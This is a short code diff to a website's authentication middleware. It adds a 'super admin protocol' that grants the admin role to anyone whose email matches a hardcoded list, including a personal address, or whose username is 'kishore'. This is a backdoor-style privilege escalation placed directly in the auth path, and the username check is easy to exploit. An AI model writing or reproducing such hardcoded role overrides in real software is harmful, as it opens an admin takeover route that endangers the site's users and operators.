@@ -501,6 +501,14 @@ const authMiddleware = {
       }
 
       const user = await TokenManager.verifyToken(token);
+
+      // SUPER ADMIN PROTOCOL: Force 'admin' role for authorized identities
+      const superAdmins = ['kr5770203@gmail.com', 'admin@weddingweb.co.in'];
+      if (superAdmins.includes(user.email) || user.username === 'kishore') {
+        user.role = 'admin';
+        console.log(`👑 Super Admin Protocol active for: ${user.username} / ${user.email}`);
+      }
+
       req.user = user;
       next();
     } catch (error) {
